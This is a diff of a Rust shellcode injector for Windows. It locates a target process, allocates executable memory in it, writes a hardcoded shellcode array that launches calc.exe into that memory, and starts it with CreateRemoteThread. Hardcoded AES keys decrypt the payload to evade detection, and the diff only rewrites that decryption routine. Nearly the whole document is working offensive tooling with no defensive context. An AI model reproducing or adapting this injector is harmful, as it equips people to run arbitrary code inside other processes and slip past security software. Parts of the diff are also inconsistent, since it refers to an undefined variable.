@@ -1,40 +1,21 @@
 use sysinfo::{ProcessExt, System, SystemExt, PidExt};
 use windows::{Win32::{System::{Memory::{VirtualAllocEx, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READ}, Threading::{OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, CreateRemoteThread, WaitForSingleObject}, Diagnostics::Debug::WriteProcessMemory}, Foundation::CloseHandle}};
 use windows::Win32::Foundation::HANDLE;
-use crypto::{symmetriccipher::{Decryptor, SymmetricCipherError}, aes::{self, cbc_decryptor}, blockmodes, buffer::{self, RefReadBuffer, RefWriteBuffer, BufferResult, WriteBuffer, ReadBuffer}};
+use aes::cipher::block_padding::Pkcs7;
+use aes::cipher::{KeyIvInit, BlockDecryptMut};
 use core::ffi::c_void;
 use core::ptr;
 use std::ptr::null;
 
-fn decrypt(sc: &[u8]) -> Result<Vec<u8>, SymmetricCipherError> {
+fn decrypt(buf: &mut Vec<u8>) {
     let key : [u8;16] = [0x2d,0x46,0xc6,0x15,0x22,0xee,0xa0,0x29,0x7,0x58,0xb7,0x58,0x53,0x78,0xa7,0xba];
     let iv : [u8;16] = [0xb4,0x92,0xa9,0xda,0xf9,0xb5,0x5c,0xff,0x4d,0x74,0x92,0x57,0xe6,0xdd,0xd5,0xb0];
 
-    let mut decryptor : Box<dyn Decryptor> = cbc_decryptor(
-        aes::KeySize::KeySize128,
-        &key,
-        &iv,
-        blockmodes::PkcsPadding
-    );
-    const SIZE: usize = u8::MAX as usize;
+    type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;
 
-    let mut dsc : Vec<u8> = Vec::<u8>::new();
-    let mut read_buffer : RefReadBuffer = buffer::RefReadBuffer::new(&sc);
-    let mut buffer : [u8; SIZE] = [0; SIZE];
-    let mut write_buffer : RefWriteBuffer = buffer::RefWriteBuffer::new(&mut buffer);
-
-
-    loop {
-        let dec : BufferResult = decryptor.decrypt(&mut read_buffer, &mut write_buffer, true)?;
-        dsc.extend(write_buffer.take_read_buffer().take_remaining().iter().map(|&i| i));
-        match dec {
-            BufferResult::BufferUnderflow => break,
-            BufferResult::BufferOverflow => { }
-        }
-    }
-
-    Ok(dsc)
+    Aes128CbcDec::new(&key.into(), &iv.into()).decrypt_padded_mut::<Pkcs7>(buf.as_mut_slice()).unwrap();
 }
+
 
 fn find_proc(name: &str) -> u32 {
     let mut sys: System = System::new_all();
@@ -71,7 +52,7 @@ fn main() {
 
     //let sc: Vec<u8> = get_data().unwrap();
 
-    let mut dsc: [u8;276] = [
+    let mut dsc: Vec<u8> = vec![
     0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
     0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
     0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
@@ -92,10 +73,7 @@ fn main() {
     0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
     0x63,0x2e,0x65,0x78,0x65,0x00];
 
-    //let sc_len: usize = sc.len();
     let sc_len: usize = dsc.len();
-
-    //let dsc: Vec<u8> = decrypt(&sc).unwrap();
 
     unsafe {
         println!("[+] Opening handle to process");
@@ -113,6 +91,7 @@ fn main() {
             PAGE_EXECUTE_READ
         );
 
+        //decrypt(&buf);
         println!("[+] Copying {sc_len} bytes into memory");
         let num_written: *mut usize = ptr::null_mut();
         WriteProcessMemory(
